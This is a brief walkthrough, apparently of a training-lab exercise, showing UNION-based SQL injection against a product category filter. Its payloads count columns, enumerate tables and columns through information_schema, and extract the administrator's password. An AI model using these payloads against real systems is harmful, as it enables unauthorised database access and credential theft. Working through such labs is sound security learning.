### We start off with column enumeration
```
/filter?category=Accessories' ORDER BY 1-- -                                   #200 OK
/filter?category=Accessories' ORDER BY 2-- -                                   #200 OK
/filter?category=Accessories' ORDER BY 3-- -                                   #Error response
```

### Next we dump all the table names
```

/filter?category=Accessories' union select table_name,null from information_schema.tables--

```

#### Result
![image](https://user-images.githubusercontent.com/86168235/125630729-1d12e6e6-c8d3-4ca2-b7cf-5df24628dced.png)



### So we dump all the columns from `users_elsufr`(yours maybe different) table
```

/filter?category=Accessories' union select column_name,null from information_schema.columns where table_name='users_elsufr'--

```

#### Result
![image](https://user-images.githubusercontent.com/86168235/125631182-9415e97a-4b14-45df-ac86-e46c1f202005.png)


### Now as we know the username and password columns, we dump the `administrator` password
```

/filter?category=Accessories' union select password_fqwflo,null from users_elsufr where username_hjeqam='administrator'--

```

#### Result
![image](https://user-images.githubusercontent.com/86168235/125631974-675860d6-e634-41f5-8ce2-60aee7bce0f6.png)
